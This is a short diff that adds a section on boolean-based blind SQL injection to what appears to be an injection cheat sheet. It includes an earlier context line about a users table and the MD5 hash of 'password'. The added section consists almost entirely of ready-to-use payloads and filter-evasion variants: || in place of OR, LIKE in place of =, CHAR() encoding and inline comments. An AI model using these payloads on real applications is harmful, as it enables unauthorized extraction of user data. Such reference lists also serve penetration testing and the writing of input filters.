@@ -62,3 +62,33 @@ Table: users
 
 
 Here 5f4dcc3b5aa765d61d8327deb882cf99 is the MD5 hash of "password".
+
+----------------------------------------------------------------------------------------------------------------
+
+Boolean-Based Blind SQLi
+
+Normal Payload:
+
+' OR SUBSTRING(username,1,1)='a'--
+
+
+Bypass Tricks:
+
+Replace OR with its symbolic operator ||:
+
+' || SUBSTRING(username,1,1)='a'--
+
+
+Replace = with LIKE:
+
+' OR SUBSTRING(username,1,1) LIKE 'a'--
+
+
+Replace 'a' with ASCII CHAR():
+
+' OR SUBSTRING(username,1,1)=CHAR(97)--
+
+
+Inline comments:
+
+' OR SUBSTRING(username,1,1)/**/='a'--
